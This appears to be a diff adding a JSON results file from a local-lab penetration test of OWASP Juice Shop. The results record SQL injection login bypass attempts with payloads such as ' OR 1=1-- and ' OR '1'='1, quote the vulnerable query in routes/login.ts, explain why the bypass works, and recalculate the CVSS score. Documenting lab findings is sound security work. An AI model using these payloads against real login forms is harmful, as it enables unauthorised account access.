@@ -1,0 +1,134 @@
+{
+  "target": "OWASP Juice Shop 20.4.0-SNAPSHOT at 127.0.0.1:3000",
+  "date": "2026-11-28",
+  "scope": "local lab only, synthetic accounts, no public hosts",
+  "results": [
+    {
+      "label": "B1-baseline-nonexistent",
+      "time_utc": "2026-11-28T07:36:58.152274+00:00",
+      "endpoint": "POST /rest/user/login",
+      "request": {
+        "email": "not-a-real-user@example.test",
+        "password": "<invalid-synthetic-redacted>",
+        "password_id": "invalid-lab-password-1"
+      },
+      "status": 401,
+      "authenticatedEmail": null,
+      "tokenReturned": false,
+      "tokenValue": "not recorded",
+      "basketIdReturned": false,
+      "raw_error": null
+    },
+    {
+      "label": "B2-baseline-admin-wrong-password",
+      "time_utc": "2026-11-28T07:36:58.165972+00:00",
+      "endpoint": "POST /rest/user/login",
+      "request": {
+        "email": "admin@juice-sh.op",
+        "password": "<invalid-synthetic-redacted>",
+        "password_id": "invalid-lab-password-1"
+      },
+      "status": 401,
+      "authenticatedEmail": null,
+      "tokenReturned": false,
+      "tokenValue": "not recorded",
+      "basketIdReturned": false,
+      "raw_error": null
+    },
+    {
+      "label": "P1-sqli-email-attempt1",
+      "time_utc": "2026-11-28T07:36:58.189135+00:00",
+      "endpoint": "POST /rest/user/login",
+      "request": {
+        "email": "' OR 1=1--",
+        "password": "<invalid-synthetic-redacted>",
+        "password_id": "invalid-lab-password-1"
+      },
+      "status": 200,
+      "authenticatedEmail": "admin@juice-sh.op",
+      "tokenReturned": true,
+      "tokenValue": "not recorded",
+      "basketIdReturned": true,
+      "raw_error": null
+    },
+    {
+      "label": "P2-sqli-email-attempt2-different-password",
+      "time_utc": "2026-11-28T07:36:58.260474+00:00",
+      "endpoint": "POST /rest/user/login",
+      "request": {
+        "email": "' OR 1=1--",
+        "password": "<invalid-synthetic-redacted>",
+        "password_id": "invalid-lab-password-2"
+      },
+      "status": 200,
+      "authenticatedEmail": "admin@juice-sh.op",
+      "tokenReturned": true,
+      "tokenValue": "not recorded",
+      "basketIdReturned": true,
+      "raw_error": null
+    },
+    {
+      "label": "P3-sqli-password-field",
+      "time_utc": "2026-11-28T07:36:58.279977+00:00",
+      "endpoint": "POST /rest/user/login",
+      "request": {
+        "email": "admin@juice-sh.op",
+        "password": "<invalid-synthetic-redacted>",
+        "password_id": "injection-payload-as-password"
+      },
+      "status": 401,
+      "authenticatedEmail": null,
+      "tokenReturned": false,
+      "tokenValue": "not recorded",
+      "basketIdReturned": false,
+      "raw_error": null
+    },
+    {
+      "label": "P4-sqli-email-variant-or-1-eq-1",
+      "time_utc": "2026-11-28T07:36:58.295080+00:00",
+      "endpoint": "POST /rest/user/login",
+      "request": {
+        "email": "' OR '1'='1",
+        "password": "<invalid-synthetic-redacted>",
+        "password_id": "invalid-lab-password-1"
+      },
+      "status": 401,
+      "authenticatedEmail": null,
+      "tokenReturned": false,
+      "tokenValue": "not recorded",
+      "basketIdReturned": false,
+      "raw_error": null
+    },
+    {
+      "label": "S1-search-sqli",
+      "time_utc": "2026-11-28T07:36:58.314610+00:00",
+      "endpoint": "GET /rest/products/search",
+      "request_q": "' OR 1=1--",
+      "status": 500,
+      "result_count": null
+    },
+    {
+      "label": "S2-search-baseline-apple",
+      "time_utc": "2026-11-28T07:36:58.379311+00:00",
+      "endpoint": "GET /rest/products/search",
+      "request_q": "apple",
+      "status": 200,
+      "result_count": 3
+    }
+  ],
+  "root_cause": {
+    "file": "routes/login.ts",
+    "line": 34,
+    "code": "models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`, { model: UserModel, plain: true })",
+    "explanation": "Email is interpolated directly into SQL. Payload ' OR 1=1-- closes the email string, makes the WHERE clause always true, and comments out the password check. Password field is hashed before interpolation, which is why P3 failed. Variant without -- failed because AND binds tighter than OR and the password hash check remained."
+  },
+  "cvss_recalc": {
+    "original_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
+    "original_score": 9.3,
+    "corrected_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N",
+    "corrected_score": 9.3,
+    "corrected_severity": "Critical",
+    "rationale": "VA changed L->N because no availability impact was demonstrated or tested. Score remains 9.3 Critical after recalculation."
+  },
+  "search_note": "GET /rest/products/search?q=' OR 1=1-- returned HTTP 500 SQLITE_ERROR incomplete input, not data. Search SQLi NOT confirmed with this payload. routes/search.ts:23 also interpolates criteria into SQL, but that is a separate UNION challenge and out of scope for F-02 login bypass."
+}
